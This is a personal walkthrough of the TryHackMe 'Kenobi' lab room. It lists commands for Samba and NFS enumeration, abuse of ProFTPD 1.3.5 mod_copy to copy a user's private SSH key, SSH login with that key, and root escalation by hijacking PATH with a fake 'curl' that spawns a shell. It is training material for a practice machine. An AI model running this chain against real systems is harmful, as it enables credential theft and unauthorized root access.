# Kenobi
## Exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.
https://tryhackme.com/room/kenobi#

### {TASK 1} Scan the machine with nmap, how many ports are open?
    nmap -sV 10.10.176.47

### {TASK 2} Enumerating Samba for Sahres
    Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system.
    Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.

    nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.176.47
    #3 shares found
    smbclient //10.10.176.47/anonymous
    #Asks for password but accepts null answer
    #log.txt seen on system
    smbget -R smb://10.10.176.47/anonymous
    #enter nothing for password and we get log.txt
    #info about ftp and ssh key is located inside file

    nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.176.47
    #gathering info about rpc
    #we see /var

### {TASK 3} Gain initial access via ProFtpd
      Get version #
        #from nmap scan earlier we see proFTPD 1.3.5
      searchsploit FTPD 1.3.5 
        #4 exploits shown
        http://www.proftpd.org/docs/contrib/mod_copy.html
          #The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.
          #We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. 
      SITE CPFR /home/kenobi/.ssh/id_rsa
      SITE CPTO /var/tmp/id_rsa
      #copied his rsa keye to tmp
      mkdir /mnt/kenobiNFS
      mount machine_ip:/var /mnt/kenobiNFS
      ls -la /mnt/kenobiNFS
        #network mount to get rsa key
      cp /mnt/kenobiNFS/tmp/id_rsa .
      chmod 600 id_rsa
      ssh -i id_rsa kenobi@10.10.176.47
        #WERE IN
      grab user flag from user.txt
 
### {TASK 4} Priv Escalation with Path Variable Manipulation
     find / -perm -u=s -type f 2>/dev/null
      #what is /usr/bin/menu
      cd /tmp
      echo /bin/sh > curl
      chmod 777 curl
      export PATH=/tmp:$PATH
     /usr/bin/menu
       #option 1
         #id shows us as root
           #We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!

